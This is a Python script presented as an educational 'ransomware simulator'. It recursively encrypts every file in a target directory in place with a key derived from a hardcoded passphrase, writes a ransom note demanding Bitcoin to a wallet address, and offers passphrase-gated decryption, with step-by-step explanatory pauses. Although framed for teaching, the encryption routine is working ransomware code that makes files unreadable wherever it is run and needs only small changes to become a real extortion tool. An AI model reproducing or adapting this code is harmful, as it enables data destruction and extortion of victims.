import os
import sys
import time
import hashlib
import base64
from datetime import datetime
from cryptography.fernet import Fernet
from colorama import init, Fore
from tqdm import tqdm

# Initialize colorama for colored output
init(autoreset=True)

# Constants
SECRET_PASSPHRASE = "Release the prisoners"
RANSOM_NOTE_NAME = "README_RESTORE_FILES.txt"

# Color settings for improved readability
COLORS = {
    "info": Fore.LIGHTBLUE_EX,      # Bright blue - General info
    "step": Fore.LIGHTCYAN_EX,      # Bright cyan - Step descriptions
    "encrypt": Fore.LIGHTYELLOW_EX, # Bright yellow - Encryption phase
    "decrypt": Fore.LIGHTGREEN_EX,  # Bright green - Decryption phase
    "error": Fore.LIGHTRED_EX,      # Bright red - Errors
    "success": Fore.LIGHTMAGENTA_EX,# Bright magenta - Success messages
    "warning": Fore.LIGHTWHITE_EX,  # Bright white - Warnings
}

def explain_step(step, title, message):
    """
    🧐 **STEP EXPLANATIONS**
    
    - **Each step is fully explained** so beginners understand exactly what's happening.
    - The script **pauses** to ensure the user can read before continuing.
    """
    print(COLORS[step] + f"\n🔍 {title}\n")
    print(Fore.YELLOW + message + "\n")
    input(Fore.CYAN + "Press ENTER to continue...\n")

def derive_key(passphrase):
    """
    🔑 STEP 1: GENERATING AN ENCRYPTION KEY

    - The encryption key is **like a master key** that locks and unlocks files.
    - Without this key, files remain **completely unreadable**.
    - If the key is **lost**, there is **NO way** to recover the files.
    """
    explain_step("info", "STEP 1: GENERATING ENCRYPTION KEY",
                 "We need to create a secret encryption key to lock and unlock files.\n"
                 "This key is generated from a passphrase and is required for decryption.\n"
                 "⚠️ WARNING: If this key is lost, files CANNOT be recovered.")

    key_hash = hashlib.sha256(passphrase.encode()).digest()
    print(COLORS["success"] + "✅ Encryption key successfully generated.\n")
    return Fernet(base64.urlsafe_b64encode(key_hash[:32]))

def timestamp():
    return datetime.now().strftime("%H:%M:%S")

def create_ransom_note(directory):
    """
    📝 STEP 2: CREATING A RANSOM NOTE

    - Hackers leave a **ransom note** with payment instructions.
    - This **note is NOT encrypted** so victims can read it.
    - The note contains **fake payment instructions** (for demonstration purposes).
    """
    explain_step("warning", "STEP 2: CREATING A RANSOM NOTE",
                 "Hackers always leave a ransom note telling victims how to pay to get their files back.\n"
                 "This note will be placed in your directory but will NOT be encrypted.")

    ransom_note_path = os.path.join(directory, RANSOM_NOTE_NAME)
    ransom_note_content = f"""
🚨 YOUR FILES HAVE BEEN ENCRYPTED! 🚨

All your personal and work files have been locked with strong encryption.
To recover them, send 1 Bitcoin to the following wallet address:

WALLET: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa

After payment, you will receive a passphrase to unlock your files.

⚠️ WARNING: Any attempt to modify encrypted files may cause permanent data loss!
"""

    try:
        with open(ransom_note_path, "w") as note:
            note.write(ransom_note_content.strip())
        print(COLORS["warning"] + f"\n🚨 RANSOM NOTE CREATED: {ransom_note_path}\n")
    except Exception as e:
        print(COLORS["error"] + f"[{timestamp()}] [ERROR] Failed to create ransom note: {e}")

def encrypt_file(file_path, fernet):
    """
    🔐 STEP 3: ENCRYPTING A FILE

    - The file is **scrambled into unreadable data**.
    - The **original file is replaced** with its encrypted version.
    - **Ransom note remains untouched**.
    """
    try:
        if RANSOM_NOTE_NAME in file_path:
            return

        file_size = os.path.getsize(file_path)
        print(COLORS["encrypt"] + f"\n[{timestamp()}] Encrypting: {file_path} ({file_size} bytes)")

        with open(file_path, "rb") as f:
            file_data = f.read()
        encrypted_data = fernet.encrypt(file_data)

        with open(file_path, "wb") as f:
            f.write(encrypted_data)

        print(COLORS["success"] + f"[{timestamp()}] ✅ Successfully encrypted: {file_path}")

    except Exception as e:
        print(COLORS["error"] + f"[{timestamp()}] [ERROR] Encryption failed for {file_path}: {e}")

def decrypt_file(file_path, fernet):
    """
    🔓 STEP 4: DECRYPTING A FILE

    - The file is **restored to its original readable state**.
    - Only the **correct decryption key** will work.
    - The ransom note is **never decrypted**.
    """
    try:
        if RANSOM_NOTE_NAME in file_path:
            return

        file_size = os.path.getsize(file_path)
        print(COLORS["decrypt"] + f"\n[{timestamp()}] Decrypting: {file_path} ({file_size} bytes)")

        with open(file_path, "rb") as f:
            encrypted_data = f.read()
        decrypted_data = fernet.decrypt(encrypted_data)

        with open(file_path, "wb") as f:
            f.write(decrypted_data)

        print(COLORS["success"] + f"[{timestamp()}] 🔓 Successfully decrypted: {file_path}")

    except Exception as e:
        print(COLORS["error"] + f"[{timestamp()}] [ERROR] Decryption failed for {file_path}: {e}")

def encrypt_directory(directory, fernet):
    explain_step("step", "STEP 3: SCANNING FILES FOR ENCRYPTION",
                 "The ransomware is now scanning your directory for files to encrypt.\n"
                 "All files except the ransom note will be scrambled and locked.")

    file_list = [os.path.join(root, file) for root, _, files in os.walk(directory) for file in files]

    if not file_list:
        print(COLORS["error"] + f"[{timestamp()}] No files found for encryption.")
        return

    explain_step("encrypt", "STEP 4: ENCRYPTING FILES",
                 "All files will now be **locked with encryption**.\n"
                 "To unlock them, the correct passphrase is needed.")

    create_ransom_note(directory)

    for file_path in tqdm(file_list, desc="🔐 Encrypting Files", colour="yellow"):
        encrypt_file(file_path, fernet)

def decrypt_directory(directory, fernet):
    explain_step("decrypt", "STEP 1: ENTER PASSPHRASE",
                 "To unlock your files, enter the correct secret passphrase.")

    user_input = input(COLORS["decrypt"] + "\n🔑 Enter passphrase: ")

    if user_input.strip() != SECRET_PASSPHRASE:
        print(COLORS["error"] + "\n⛔ Incorrect passphrase. Decryption aborted.")
        sys.exit(1)

    explain_step("decrypt", "STEP 2: DECRYPTING FILES",
                 "Your files will now be restored to their original state.")

    file_list = [os.path.join(root, file) for root, _, files in os.walk(directory) for file in files]

    for file_path in tqdm(file_list, desc="🔓 Decrypting Files", colour="blue"):
        decrypt_file(file_path, fernet)

if __name__ == "__main__":
    explain_step("info", "🚀 WELCOME TO THE RANSOMWARE SIMULATOR!",
                 "This program demonstrates how ransomware encrypts and decrypts files.")

    if len(sys.argv) < 3:
        print("Usage: python3 ransomware_simulator.py <encrypt|decrypt> <target_directory>")
        sys.exit(1)

    action = sys.argv[1].lower()
    target_directory = sys.argv[2]
    fernet = derive_key(SECRET_PASSPHRASE)

    if action == "encrypt":
        encrypt_directory(target_directory, fernet)
    elif action == "decrypt":
        decrypt_directory(target_directory, fernet)
